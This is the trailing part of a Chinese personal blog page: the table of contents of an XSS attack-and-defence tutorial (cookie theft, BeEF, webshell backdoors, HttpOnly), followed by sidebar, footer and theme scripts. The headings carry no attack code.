href="#%EF%BC%882%EF%BC%89%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85"><span class="toc-text">（2）靶场安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB-1"><span class="toc-text">（3）进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95-1"><span class="toc-text">① 初次尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-XSS-%E5%B9%B3%E5%8F%B0%E8%8E%B7%E5%8F%96-cookie"><span class="toc-text">② XSS 平台获取 cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-postman-%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-text">③ postman 登录后台</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89Beef-%E7%BB%93%E5%90%88-XSS-%E6%94%BB%E5%87%BB"><span class="toc-text">（4）Beef 结合 XSS 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E5%AE%89%E8%A3%85-Beef-xss"><span class="toc-text">① 安装 Beef-xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E4%BD%BF%E7%94%A8-beef-xss"><span class="toc-text">② 使用 beef-xss</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81WebShell-%E7%AE%B1%E5%AD%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-text">4、WebShell 箱子管理系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA-1"><span class="toc-text">（1）搭建靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E9%9D%B6%E5%9C%BA%E4%B8%8B%E8%BD%BD"><span class="toc-text">① 靶场下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E5%B0%8F%E6%97%8B%E9%A3%8E%E4%B8%8B%E8%BD%BD"><span class="toc-text">② 小旋风下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-text">③ 靶场搭建</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-text">（2）进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E6%A8%A1%E6%8B%9F-webshell-%E5%8E%9F%E4%BD%9C%E8%80%85%E8%BF%9B%E8%A1%8C%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB"><span class="toc-text">① 模拟 webshell 原作者进行后门攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E5%8F%8D%E6%9D%80-webshell-%E5%8E%9F%E4%BD%9C%E8%80%85"><span class="toc-text">② 反杀 webshell 原作者</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E4%BD%BF%E7%94%A8-JS-%E4%BB%A3%E7%A0%81%E8%8E%B7%E5%8F%96-Cookie"><span class="toc-text">5、使用 JS 代码获取 Cookie</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81XSS-%E6%94%BB%E5%87%BB%E7%9A%84%E6%A3%80%E6%B5%8B"><span class="toc-text">六、XSS 攻击的检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E8%8E%B7%E5%8F%96-Session-%E6%80%9D%E8%B7%AF"><span class="toc-text">七、获取 Session 思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81HttpOnly"><span class="toc-text">八、HttpOnly</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF-HttpOnly"><span class="toc-text">1、什么是 HttpOnly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81HttpOnly-%E7%9A%84%E8%AE%BE%E7%BD%AE%E6%A0%B7%E4%BE%8B"><span class="toc-text">2、HttpOnly 的设置样例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89JavaEE"><span class="toc-text">（1）JavaEE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89C"><span class="toc-text">（2）C#</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89VB-NET"><span class="toc-text">（3）VB.NET</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89PHP%E2%89%A55-2"><span class="toc-text">（4）PHP≥5.2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89PHP4-%E5%92%8C-PHP%E2%89%A45-1"><span class="toc-text">（5）PHP4 和 PHP≤5.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%8F%8D%E5%88%B6-HttpOnly"><span class="toc-text">3、反制 HttpOnly</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89Cookie-%E5%BD%A2%E5%BC%8F"><span class="toc-text">（1）Cookie 形式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E7%9B%B4%E6%8E%A5%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95"><span class="toc-text">（2）直接账号密码登录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E8%AF%BB%E5%8F%96%E4%BF%9D%E5%AD%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-text">① 读取保存账号密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E8%AF%BB%E5%8F%96%E6%B2%A1%E4%BF%9D%E5%AD%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-text">② 读取没保存账号密码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-text">九、安全修复方案</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/15/%E5%8C%BF%E5%90%8D/%E6%83%85%E4%BA%BA/" title="做情人真的没有好下场吗？"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="做情人真的没有好下场吗？"/></a><div class="content"><a class="title" href="/2023/08/15/%E5%8C%BF%E5%90%8D/%E6%83%85%E4%BA%BA/" title="做情人真的没有好下场吗？">做情人真的没有好下场吗？</a><time datetime="2023-08-14T16:00:00.000Z" title="发表于 2023-08-15 00:00:00">2023-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/30/%E5%8C%BF%E5%90%8D/%E4%B8%8D%E7%88%B1%E6%80%8E%E4%B9%88%E8%B5%B0%E4%B8%8B%E5%8E%BB/" title="不爱前行"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="不爱前行"/></a><div class="content"><a class="title" href="/2023/07/30/%E5%8C%BF%E5%90%8D/%E4%B8%8D%E7%88%B1%E6%80%8E%E4%B9%88%E8%B5%B0%E4%B8%8B%E5%8E%BB/" title="不爱前行">不爱前行</a><time datetime="2023-07-29T16:00:00.000Z" title="发表于 2023-07-30 00:00:00">2023-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/22/%E5%8C%BF%E5%90%8D/%E7%A7%9F%E6%88%BF%E6%97%B6%E5%85%89/" title="租房时光"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="租房时光"/></a><div class="content"><a class="title" href="/2023/07/22/%E5%8C%BF%E5%90%8D/%E7%A7%9F%E6%88%BF%E6%97%B6%E5%85%89/" title="租房时光">租房时光</a><time datetime="2023-07-21T16:00:00.000Z" title="发表于 2023-07-22 00:00:00">2023-07-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/11/%E6%97%85%E8%A1%8C/%E6%95%85%E5%AE%AB%E8%AE%B0/" title="故宫记"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="故宫记"/></a><div class="content"><a class="title" href="/2023/06/11/%E6%97%85%E8%A1%8C/%E6%95%85%E5%AE%AB%E8%AE%B0/" title="故宫记">故宫记</a><time datetime="2023-06-10T16:00:00.000Z" title="发表于 2023-06-11 00:00:00">2023-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/29/%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%81%93%E9%81%93%E4%B9%8B%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集道道之外网信息收集"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息收集道道之外网信息收集"/></a><div class="content"><a class="title" href="/2023/05/29/%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%81%93%E9%81%93%E4%B9%8B%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集道道之外网信息收集">信息收集道道之外网信息收集</a><time datetime="2023-05-28T16:00:00.000Z" title="发表于 2023-05-29 00:00:00">2023-05-29</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-上班摸鱼中.svg" alt="距离月入25k也就还差一个大佬带我~" title="距离月入25k也就还差一个大佬带我~"/><div id="runtimeTextTip"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 By <a class="footer-bar-link" href="/" title="Jack hou" target="_blank">Jack hou</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">11</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://www.houyanbin.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.png" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=8868465080&amp;server=tencent&amp;type=0"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Article/" style="font-size: 0.88rem; color: rgb(129, 174, 15);">Article<sup>4</sup></a><a href="/tags/CSRF/" style="font-size: 0.88rem; color: rgb(176, 101, 156);">CSRF<sup>1</sup></a><a href="/tags/Git/" style="font-size: 0.88rem; color: rgb(100, 25, 46);">Git<sup>1</sup></a><a href="/tags/Java/" style="font-size: 0.88rem; color: rgb(18, 21, 16);">Java<sup>3</sup></a><a href="/tags/JavaScript/" style="font-size: 0.88rem; color: rgb(118, 20, 198);">JavaScript<sup>17</sup></a><a href="/tags/Linux/" style="font-size: 0.88rem; color: rgb(88, 178, 185);">Linux<sup>1</sup></a><a href="/tags/Pikachu/" style="font-size: 0.88rem; color: rgb(83, 40, 104);">Pikachu<sup>1</sup></a><a href="/tags/SQL/" style="font-size: 0.88rem; color: rgb(147, 39, 150);">SQL<sup>2</sup></a><a href="/tags/XAUUSD/" style="font-size: 0.88rem; color: rgb(22, 68, 65);">XAUUSD<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 0.88rem; color: rgb(9, 124, 41);">XSS<sup>2</sup></a><a href="/tags/%E3%80%8AJavaScript%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E3%80%8B/" style="font-size: 0.88rem; color: rgb(145, 180, 116);">《JavaScript权威指南》<sup>17</sup></a><a href="/tags/%E5%8C%BF%E5%90%8D/" style="font-size: 0.88rem; color: rgb(69, 9, 123);">匿名<sup>3</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 0.88rem; color: rgb(164, 159, 166);">博客<sup>10</sup></a><a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem; color: rgb(62, 75, 172);">安全<sup>20</sup></a><a href="/tags/%E6%94%AF%E4%BB%98/" style="font-size: 0.88rem; color: rgb(106, 19, 64);">支付<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2/" style="font-size: 0.88rem; color: rgb(196, 190, 130);">攻防<sup>1</sup></a><a href="/tags/%E6%97%85%E8%A1%8C/" style="font-size: 0.88rem; color: rgb(192, 86, 38);">旅行<sup>1</sup></a><a href="/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 0.88rem; color: rgb(165, 130, 167);">虚拟机<sup>4</sup></a><a href="/tags/%E8%B6%8A%E6%9D%83/" style="font-size: 0.88rem; color: rgb(113, 100, 177);">越权<sup>2</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8868465080" server="tencent" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8868465080&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("4/15/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2023 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Jack hou 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("4/15/2023 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      if (img != null) {
        img.src = "https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-下班啦.svg";
        img.title = "下班了就该开开心心的玩耍，嘿嘿~";
        img.alt = "下班了就该开开心心的玩耍，嘿嘿~";
      }

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

